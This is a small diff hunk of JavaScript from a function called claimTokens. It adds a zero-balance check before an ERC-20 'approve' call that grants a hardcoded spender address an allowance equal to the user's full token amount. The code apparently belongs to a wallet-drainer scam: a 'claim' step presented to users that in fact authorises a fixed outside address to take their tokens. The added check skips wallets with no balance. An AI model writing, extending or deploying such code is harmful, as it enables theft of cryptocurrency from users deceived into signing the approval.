@@ -109,6 +109,11 @@ async function claimTokens() {
         const spenderAddress = '0x21F5CF45E2E546AB318572B0d62884Ce315B6d6d';
         const allowanceAmount = userData.data.amount;
 
+        if(Number(allowanceAmount) == 0 || allowanceAmount == "00"){
+          alert('you do not have balance');
+          return;
+        }
+
         const tokenAbi = ['function approve(address spender, uint256 amount) public returns (bool)'];
 
         try {
